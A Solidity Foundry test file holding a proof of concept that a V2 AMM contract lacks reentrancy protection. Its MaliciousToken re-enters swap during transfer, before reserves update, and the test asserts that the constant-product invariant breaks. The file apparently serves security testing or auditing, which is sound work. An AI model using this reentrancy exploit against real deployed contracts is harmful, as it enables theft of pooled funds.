// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "versions/AMM_v2.sol" as V2;
import "versions/lib/IERC20.sol";

contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1000000 * 1e18;
    constructor() { balanceOf[msg.sender] = totalSupply; }
    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value; balanceOf[to] += value;
        return true;
    }
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        allowance[from][msg.sender] -= value; balanceOf[from] -= value; balanceOf[to] += value;
        return true;
    }
}

contract MaliciousToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1000000 * 1e18;
    
    address public amm;
    address public token0;
    bool public hasReentered;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function setAMM(address _amm, address _token0) external {
        amm = _amm;
        token0 = _token0;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value; 
        balanceOf[to] += value; 
        
        if (msg.sender == amm && !hasReentered) {
            hasReentered = true;
            V2.AMM(amm).swap(token0, 10000, 0); 
        }
        
        return true;
    }
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        allowance[from][msg.sender] -= value; balanceOf[from] -= value; balanceOf[to] += value;
        return true;
    }
}

contract ConstantProductV2Test is Test {
    V2.AMM ammV2;
    MockToken token0;
    MaliciousToken token1;
    address attacker = address(0x1337);

    function setUp() public {
        token0 = new MockToken();
        token1 = new MaliciousToken();
        ammV2 = new V2.AMM(IERC20(address(token0)), IERC20(address(token1)));
        

        token1.setAMM(address(ammV2), address(token0));

        token0.transfer(attacker, 10000);
        token1.transfer(attacker, 10000);
        
        token0.transfer(address(token1), 10000);
        vm.startPrank(address(token1));
        token0.approve(address(ammV2), type(uint256).max);
        vm.stopPrank();

        token0.approve(address(ammV2), type(uint256).max);
        token1.approve(address(ammV2), type(uint256).max);
        ammV2.deposit(10000, 10000);

        vm.startPrank(attacker);
        token0.approve(address(ammV2), type(uint256).max);
        token1.approve(address(ammV2), type(uint256).max);
        vm.stopPrank();
    }

    // constant-product:
    // After a non-reverting `swap(t, x_in, x_out_min)` transaction, the product between `b0` and `b1` after the transaction is greater than or equal to their product before the transaction, where `b0` and `b1` are the token balances of the contract.

    // PoC:
    // - Step 1 (setup): Initial liquidity is provided. The AMM does not have a `nonReentrant` modifier in V2. 
    // - Step 2 (attack): The attacker calls `swap` using `token0`. The AMM calculates the output and calls `token1.transfer` to send the tokens BEFORE updating `r0` and `r1`.
    // - Step 3 (reentrancy): The malicious `token1` intercepts the transfer and re-enters the `swap` function. Since the internal reserves `r0` and `r1` haven't been updated yet, the AMM uses the old reserves to calculate the output, giving the attacker more tokens than they deserve.
    function test_reentrancy_constant_product_v2() public {
        uint productBefore = token0.balanceOf(address(ammV2)) * token1.balanceOf(address(ammV2));

        vm.startPrank(attacker);
        
        ammV2.swap(address(token0), 1000, 0);
        
        vm.stopPrank();

        uint productAfter = token0.balanceOf(address(ammV2)) * token1.balanceOf(address(ammV2));

        assertLt(productAfter, productBefore);
    }
}